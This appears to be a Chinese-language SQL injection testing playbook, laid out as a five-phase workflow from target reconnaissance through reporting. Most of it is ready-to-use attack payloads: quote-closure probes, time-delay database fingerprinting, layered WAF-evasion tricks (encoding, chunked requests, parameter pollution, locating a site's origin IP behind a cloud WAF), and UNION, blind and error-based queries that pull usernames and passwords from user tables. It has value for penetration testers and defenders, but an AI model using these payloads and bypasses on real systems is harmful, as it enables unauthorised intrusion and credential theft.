SQL 注入测试完整流程

Phase 1 ──→ Phase 2 ──→ Phase 3 ──→ Phase 4 ──→ Phase 5
  侦察         探测         确认          利用          报告

Phase 1 · 侦察（信息收集，不发包）

先看懂目标，别盲目上 payload。

目标URL/参数
    │
    ├─ 看后缀：.asp → ASP/Access/MSSQL
    │            .aspx → ASP.NET/MSSQL
    │            .php → PHP/MySQL
    │            .jsp → Java/Oracle/MySQL
    │            .js → API (JSON)
    │
    ├─ 看Cookie：ASPSESSIONID → 经典ASP
    │              ASP.NET_SessionId → ASP.NET
    │              PHPSESSID → PHP
    │              JSESSIONID → Java
    │
    ├─ 看编码：charset=gbk → 可能有宽字节注入
    │
    └─ 看服务器头：Server: *** 隐藏 → 云WAF
                     Server: Microsoft-IIS → Windows
                     Server: nginx → Linux反代

Phase 2 · 注入点探测（发 payload 试反应）

Step 2.1 建立基线

参数=正常值
     └─ 记录：HTTP状态码、响应大小、响应内容、响应时间

Step 2.2 塞特殊字符

参数=正常值'
     ├─ HTTP 500 / 错误页 / SQL语法错误
     │   └─ → 怀疑注入，进 Phase 2.3
     │
     ├─ HTTP 200，但内容/大小和正常一样
     │   └─ → 可能被转义或过滤，试宽字节：参数=%df'
     │
     ├─ curl: (52) Empty reply
     │   └─ → WAF拦截，进 Phase 3 WAF绕过
     │
     └─ HTTP 200，改变了页面数据
         └─ → 可能是数字型，试：参数-0 和 参数-1 看有无差异

Step 2.3 闭合确认（用注释修复）

参数=1'--
     ├─ HTTP 200（恢复正常）→ 单引号闭合，进 Phase 2.4
     │
     ├─ 还是500 → 试其他闭合：
     │   参数=1"--       （双引号）
     │   参数=1')--      （带括号）
     │   参数=1"))--     （多层括号）
     │   参数=1' #       （MySQL的#注释）
     │
     └─ 还是不行？→ 可能是数字型，试：
        参数=1 AND 1=1   比  参数=1 AND 1=2   看有差异吗？

Step 2.4 判断数据库类型

参数=1' AND 1=1--
     ├─ 200 → 继续（MySQL/MSSQL/PG/Oracle）
     ├─ 空或异常 → 关键字被拦，换方式：
     │   参数=1' /*!50000AND*/ 1=1--   (MySQL注释绕过)
     │   参数=1' %26%26 1=1--          (& & 绕过，需URL编码)
     │   参数=1' AND 1=1--             (无空格)
     └─ 如果以上全部Empty reply → WAF，进Phase3
​
同时判断数据库：
     参数=1' AND '1'='1     (字符型探测)
     参数=1' WAITFOR DELAY '0:0:5'--
         ├─ 延时5秒 → MSSQL ✅
         │
     参数=1' AND SLEEP(5)--
         ├─ 延时5秒 → MySQL/PG ✅
         │
     参数=1' AND pg_sleep(5)--
         ├─ 延时5秒 → PostgreSQL ✅
         │
     参数=1' AND dbms_pipe.receive_message('a',5)=1--
         ├─ 延时5秒 → Oracle ✅
         │
     参数=1'/**/iif(1=1,1,0)=1
         └─ 成功 → Access

Phase 3 · WAF 绕过（如果被拦）

被WAF拦了怎么办→ 按这个顺序试：
​
第一层：编码层（最便宜）
    ├─ 大小写：UnIoN SeLeCt
    ├─ 注释插入：UN/**/ION SEL/**/ECT
    ├─ 双写：UNUNIONION SELSELECTECT
    ├─ URL编码：%55%4e%49%4f%4e
    ├─ 双重编码：%2555%254e...（WAF解码一次%25→%，后端再解一次）
    └─ GKB宽字节：%df' 吃掉转义反斜杠
​
第二层：语义层
    ├─ 关键字替换：AND→&&  OR→||  1=1→1 LIKE 1
    ├─ 等号替换：= → LIKE / IN / BETWEEN / REGEXP
    ├─ 空格替换：/**/  %09  %0a  %0d  %0b  %0c  括号嵌套
    └─ 函数替换：substring()→mid()→substr()→left()
​
第三层：协议层（更底层）
    ├─ HPP参数污染：?id=1&id=UNION&id=SELECT&id=1,2,3
    ├─ Transfer-Encoding: chunked（分块发，关键字拆到不同块）
    ├─ Content-Type: multipart/form-data（绕过表单检测）
    ├─ HTTP方法覆盖：POST改PUT，或X-HTTP-Method-Override
    ├─ 超长参数填充：填充5000+字节垃圾溢出WAF缓冲区
    └─ 换入口：Cookie / Header / User-Agent / Referer / XFF
​
第四层：架构层
    ├─ 找源站IP：绕过云WAF直接打（fofa/censys/historical DNS）
    ├─ 找同站不同子域（可能有不同WAF规则）
    └─ 找无WAF的旧版接口（/api/v1/  vs  /api/v2/）

Phase 4 · 利用（注出数据）

Step 4.1 探字段数

优先试 ORDER BY（几乎所有数据库都支持）：
    参数=1' ORDER BY 1--
    参数=1' ORDER BY 2--
    参数=1' ORDER BY 3--
    ... 直到报错，N-1就是字段数
​
    备选（怕ORDER关键字被拦）：
    参数=-1' UNION SELECT NULL--
    参数=-1' UNION SELECT NULL,NULL--
    参数=-1' UNION SELECT NULL,NULL,NULL--
    ... 直到不报错，NULL的个数 = 字段数

Step 4.2 判断回显位

参数=-1' UNION SELECT 1,2,3,4--
    └─ 看页面上哪个数字显示出来了
        ├─ 显示 1 → 第1列是回显位
        ├─ 显示 2 → 第2列是回显位
        └─ 什么都没显示 / 0条结果 → UNION不回显，走盲注

Step 4.3a 有回显 → UNION注入

参数=-1' UNION SELECT 1,database(),version(),4--
参数=-1' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables--
参数=-1' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--
参数=-1' UNION SELECT 1,username,password,4 FROM users--

Step 4.3b 无回显 → 盲注

布尔盲注（有条件差异）：
    参数=1' AND (SELECT LEN(password) FROM users WHERE id=1) > 5--
    └─ 比较页面差异逐字推断
​
时间盲注（无条件差异）：
    参数=1' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>97, SLEEP(3), 0)--
    └─ 靠延时逐字推断
​
报错注入（MSSQL特有）：
    参数=1' AND 1=CONVERT(INT, (SELECT @@version))--
    └─ 错误信息里返回查询结果

Phase 5 · 取证与报告

确认漏洞后记录：
​
1. HTTP请求包（完整抓包，包含Header和Body）
2. 证明注入的对比证据：
    正常请求    → 响应
    注入成功后  → 响应（内容变化/时间差/报错信息）
3. 至少复现3次（证明不是偶然）
4. 输出报告：
    漏洞名称
    影响参数
    数据库类型/版本
    能读取的表和数据
    CVSS评分

速查卡（一张图记住流程）

拿目标
  ↓
参数加 ' 看报错              ← 探注入点
  ↓
加 -- 或 # 看恢复            ← 确认闭合方式
  ↓
ORDER BY / UNION NULL       ← 探字段数  
  ↓
UNION SELECT 1,2,3,4        ← 找显示位
  ↓
查库名 → 表名 → 列名 → 数据  ← 取数据
  ↓
如果以上某步被WAF拦          
  → 编码绕过 → 协议绕过 → 换入口 → 找源站IP

ORDER BY 各数据库支持情况

数据库 | ORDER BY | 注释 | 说明 -- | -- | -- | -- MySQL | ✅ | -- / # | 最常用 MSSQL | ✅ | -- | 经典ASP常用 Oracle | ✅ | -- | 注意 FROM DUAL PostgreSQL | ✅ | -- | 与MySQL类似 Access | ✅ 但无注释 | 不支持--/# | 改用报错注入或/**/ SQLite | ✅ | -- | 有限支持 MongoDB | ❌ | - | NoSQL，完全不同

一句话总结

探注入 → 加 ' 看报错    闭注释 → 加 -- 看恢复
确字段 → ORDER BY递进    看回显 → UNION SELECT 1,2,3
出数据 → 查库→查表→查列  被WAF拦 → 编码→协议→换入口
